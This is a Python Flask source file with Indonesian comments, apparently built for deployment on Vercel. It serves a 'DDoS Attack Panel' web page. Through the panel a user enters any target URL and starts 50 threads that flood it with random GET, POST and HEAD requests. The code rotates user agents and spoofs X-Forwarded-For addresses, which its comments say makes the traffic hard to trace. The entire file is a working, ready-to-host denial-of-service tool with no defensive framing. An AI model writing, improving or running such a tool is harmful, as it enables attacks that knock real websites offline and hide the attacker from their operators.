# api/ddos.py
from flask import Flask, request, jsonify
import threading
import requests
import time
import random
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Variable global buat nyimpen status serangan
attack_active = False
target_url = ""
threads = []
request_count = 0

def generate_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def attack_worker():
    global request_count, attack_active
    
    # Header palsu biar susah dilacak
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36"
    ]
    
    while attack_active:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "X-Forwarded-For": generate_random_ip(),
                "Accept": "*/*",
                "Connection": "keep-alive"
            }
            
            # Request random method biar lebih berat
            method = random.choice(["GET", "POST", "HEAD"])
            
            if method == "GET":
                response = requests.get(target_url, headers=headers, timeout=5)
            elif method == "POST":
                response = requests.post(target_url, headers=headers, data={"data": "x"*1000}, timeout=5)
            else:
                response = requests.head(target_url, headers=headers, timeout=5)
            
            request_count += 1
            print(f"[ATTACK] Request #{request_count} ke {target_url} - Status: {response.status_code}")
            
        except:
            request_count += 1
            print(f"[ATTACK] Request #{request_count} - Gagal/Gateway Timeout")
        
        # Delay kecil biar gak terlalu ngebut (opsional)
        time.sleep(0.1)

@app.route('/', methods=['GET'])
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>DDoS Panel 🔥</title>
        <style>
            body { background: black; color: #0f0; font-family: monospace; padding: 20px; }
            input, button { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; }
            button:hover { background: #0f0; color: black; cursor: pointer; }
        </style>
    </head>
    <body>
        <h1>⚡ DDoS Attack Panel ⚡</h1>
        <div>
            <input type="url" id="url" placeholder="https://target.com" size="50">
            <button onclick="startAttack()">🔥 MULAI SERANGAN 🔥</button>
            <button onclick="stopAttack()">🛑 BERHENTI 🛑</button>
        </div>
        <div id="status" style="margin-top: 20px;"></div>
        
        <script>
            async function startAttack() {
                const url = document.getElementById('url').value;
                if (!url) {
                    alert('Masukin URL target dulu bang!');
                    return;
                }
                
                document.getElementById('status').innerHTML = '⏳ Memulai serangan...';
                
                const response = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({url: url})
                });
                
                const data = await response.json();
                document.getElementById('status').innerHTML = data.message;
            }
            
            async function stopAttack() {
                document.getElementById('status').innerHTML = '⏳ Menghentikan serangan...';
                
                const response = await fetch('/stop', {
                    method: 'POST'
                });
                
                const data = await response.json();
                document.getElementById('status').innerHTML = data.message;
            }
            
            // Auto update status
            setInterval(async () => {
                const response = await fetch('/status');
                const data = await response.json();
                if (data.active) {
                    document.getElementById('status').innerHTML = 
                        `🔥 SERANGAN BERJALAN 🔥<br>` +
                        `Target: ${data.target}<br>` +
                        `Total Request: ${data.requests}`;
                }
            }, 2000);
        </script>
    </body>
    </html>
    """

@app.route('/start', methods=['POST'])
def start_attack():
    global attack_active, target_url, threads, request_count
    
    data = request.json
    new_target = data.get('url')
    
    if not new_target:
        return jsonify({"status": "error", "message": "URL target diperlukan!"})
    
    # Hentikan serangan yang sedang berjalan
    if attack_active:
        attack_active = False
        time.sleep(1)
        threads = []
        request_count = 0
    
    # Mulai serangan baru
    target_url = new_target
    attack_active = True
    request_count = 0
    
    # Buat 50 thread biar mantap
    for i in range(50):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    return jsonify({
        "status": "success", 
        "message": f"🚀 Serangan dimulai ke {target_url} dengan 50 thread!"
    })

@app.route('/stop', methods=['POST'])
def stop_attack():
    global attack_active
    
    if attack_active:
        attack_active = False
        return jsonify({"status": "success", "message": "🛑 Serangan dihentikan!"})
    else:
        return jsonify({"status": "info", "message": "Tidak ada serangan aktif"})

@app.route('/status', methods=['GET'])
def get_status():
    global attack_active, target_url, request_count
    
    return jsonify({
        "active": attack_active,
        "target": target_url if attack_active else None,
        "requests": request_count
    })

# Buat Vercel
app = app
